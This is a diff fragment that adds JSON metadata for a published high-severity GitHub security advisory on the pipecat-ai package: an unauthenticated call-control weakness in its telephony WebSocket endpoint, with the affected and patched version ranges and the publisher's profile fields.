+        "avatar_url": "https://avatars.githubusercontent.com/u/1924426?v=4",
+        "events_url": "https://api.github.com/users/markbackman/events{/privacy}",
+        "followers_url": "https://api.github.com/users/markbackman/followers",
+        "following_url": "https://api.github.com/users/markbackman/following{/other_user}",
+        "gists_url": "https://api.github.com/users/markbackman/gists{/gist_id}",
+        "gravatar_id": "",
+        "html_url": "https://github.com/markbackman",
+        "id": 1924426,
+        "login": "markbackman",
+        "node_id": "MDQ6VXNlcjE5MjQ0MjY=",
+        "organizations_url": "https://api.github.com/users/markbackman/orgs",
+        "received_events_url": "https://api.github.com/users/markbackman/received_events",
+        "repos_url": "https://api.github.com/users/markbackman/repos",
+        "site_admin": false,
+        "starred_url": "https://api.github.com/users/markbackman/starred{/owner}{/repo}",
+        "subscriptions_url": "https://api.github.com/users/markbackman/subscriptions",
+        "type": "User",
+        "url": "https://api.github.com/users/markbackman",
+        "user_view_type": "public"
+      },
+      "severity": "high",
+      "state": "published",
+      "submission": null,
+      "summary": "Telephony WebSocket `/ws` Unauthenticated Call-Control Abuse via Attacker-Supplied Call SID",
+      "updated_at": "2026-06-17T14:39:37Z",
+      "url": "https://api.github.com/repos/pipecat-ai/pipecat/security-advisories/GHSA-j8cv-x86q-rj85",
+      "vulnerabilities": [
+        {
+          "package": {
+            "ecosystem": "pip",
+            "name": "pipecat-ai"
+          },
+          "patched_versions": ">=1.4.0",
+          "vulnerable_functions": [],
+          "vulnerable_version_range": "<= 0.0.77,<1.4.0"
+        }
+      ],
+      "withdrawn_at": null
+    },
+    "reference": "https://github.com/pipecat-ai/pipecat/security/advisories/GHSA-j8cv-x86q-rj85",
+    "retrieved_at": "2026-08-14T18:58:04.424004+00:00",
+    "snapshot_role": "canonical_source"
+  }
+}
